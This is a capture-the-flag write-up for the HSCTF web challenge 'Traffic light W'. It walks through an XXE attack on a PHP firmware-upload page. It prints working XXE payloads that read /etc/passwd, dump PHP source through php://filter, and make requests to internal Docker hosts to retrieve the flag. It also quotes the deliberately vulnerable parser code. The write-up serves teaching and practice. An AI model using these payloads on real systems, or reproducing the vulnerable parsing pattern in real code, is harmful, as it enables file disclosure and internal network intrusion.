# Traffic light W

Category: Web

Points: 337

> 🚦Can you figure out what's going on with this shady company?
>
> https://traffic-light-w.web.hsctf.com/
>
> Author: meow

The site appears to be some admin panel where you can "Upload firmware" in XML format.  An example XML is provided:

```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<root>
  <content>Red</content>
</root>
```

Some misconfigured XML parsers ~~(hmm PHP)~~ are vulnerable to [XXE](https://portswigger.net/web-security/xxe)  (XML eXternal Entity) attacks. Essentially,  the XML parser can be forced fetch data from websites, read local files, or in the case of PHP, execute code.

A simple attack to read `/etc/passwd`:

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <content>&xxe;</content>
</root>
```

Unfortunately, modifying the attack to read `/flag.txt` fails.

Fortunately, there are a variety of [protocols](https://www.cdxy.me/?p=752) that PHP supports. One of these is the [Expect](https://www.php.net/manual/en/wrappers.expect.php) protocol, which allows for RCE: `expect://ls`. Unfortunately, it is rarely enabled and seems to be disabled here. Next, the `php://filter/read` protocol can allows us to read files and make HTTP requests. We can then read the source files:

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=firmware_upload.php">
]>
<root>
  <content>&xxe;</content>
</root>
```

Decoded:

```php
<?php
if (isset($_GET["xml"])) {
  libxml_disable_entity_loader (false);

  $xml = strlen($_GET["xml"]) > 0 ? $_GET["xml"] : "Firmware Update Failed";

  $document = new DOMDocument();
  $document->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD);
  $parsed = simplexml_import_dom($document);

  echo $parsed->content;
}
?>
```

Indeed, the application is vulnerable to XXE. However, still no flag though. 

I was stuck here for quite some time, until an organizer told me that the flag is not on the server. 

Looking back to the main page, we see the following table:

| #     | Active | Docker Hostname    | Port    | Firmware                                                     |
| ----- | ------ | ------------------ | ------- | ------------------------------------------------------------ |
| 1,001 | True   | traffic-light-1001 | 80      | [Upload Firmware](https://traffic-light-w.web.hsctf.com/firmware_upload.php?light=1001) |
| 1,002 | False  | Offline            | Offline | Upload Firmware                                              |
| 1,003 | False  | Offline            | Offline | Upload Firmware                                              |
| 1,004 | True   | traffic-light-1004 | 80      | [Upload Firmware](https://traffic-light-w.web.hsctf.com/firmware_upload.php?light=1004) |
| 1,005 | False  | Offline            | Offline | Upload Firmware                                              |

The `Docker Hostname` column is particularly interesting. It allows containers on the same network to communicate with one another using only the hostname.

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://traffic-light-1001:80">
]>
<root>
  <content>&xxe;</content>
</root>
```

Unfortunately, this request turned up nothing. The flag is actually in the `1,004` traffic light.

```xml-dtd
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=http://traffic-light-1004:80">
]>
<root>
  <content>&xxe;</content>
</root>
```

Decoding the base64: 

```
If you're reading this... You found out that the traffic lights are fake.
Don't tell anyone. Here's a flag to make you happy: flag{shh_im_mining_bitcoin}
```

